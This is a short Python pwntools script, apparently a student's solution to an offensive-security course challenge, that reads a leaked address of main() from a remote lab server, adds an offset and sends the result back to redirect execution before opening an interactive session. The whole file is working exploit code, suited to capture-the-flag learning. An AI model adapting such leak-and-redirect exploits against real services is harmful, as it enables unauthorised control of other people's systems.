from pwn import *

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1244)

print(conn.recvuntil(b'NetID (something like abc123): ').decode())
conn.sendline(b'vc2499')

print(conn.recvuntil(b'I found the raw bytes address of main() written somewhere: ').decode())
main_addr = u64(conn.recvn(6).ljust(8, b'\x00'))

func_addr = main_addr + 0x22
conn.send(p64(func_addr)[:6])

conn.interactive()



